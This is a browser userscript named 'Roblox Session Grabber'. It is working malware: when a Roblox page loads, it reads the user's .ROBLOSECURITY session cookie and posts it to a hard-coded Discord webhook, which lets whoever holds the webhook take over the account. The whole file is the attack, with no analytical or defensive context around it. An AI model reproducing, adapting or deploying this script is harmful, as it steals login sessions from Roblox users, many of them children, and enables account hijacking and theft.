// ==UserScript==
// @name         Roblox Session Grabber
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Extracts .ROBLOSECURITY cookie and sends to Discord
// @author       You
// @match        https://www.roblox.com/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1559805640774524969/9YFLND4t8VCdtPe7GDUA9wbmCjP3ESqUPTrkKh-H0ucnCL3EHx_Sf9Zupy5ECBIZ_ZSK";

    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
        return null;
    }

    function sendToDiscord() {
        const robloxCookie = getCookie(".ROBLOSECURITY");

        if (!robloxCookie) {
            console.log("Tampermonkey: No .ROBLOSECURITY cookie found.");
            return;
        }

        const payload = {
            content: `**Roblox Account Captured via Tampermonkey!**\n\n**Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\`\n\n*IP: ${window.location.hostname}*`
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(() => console.log("Tampermonkey: Cookie sent successfully."))
        .catch(err => console.error("Tampermonkey: Error sending cookie.", err));
    }

    // Wait for the document to be fully loaded to ensure cookies are set
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', sendToDiscord);
    } else {
        sendToDiscord();
    }
})();
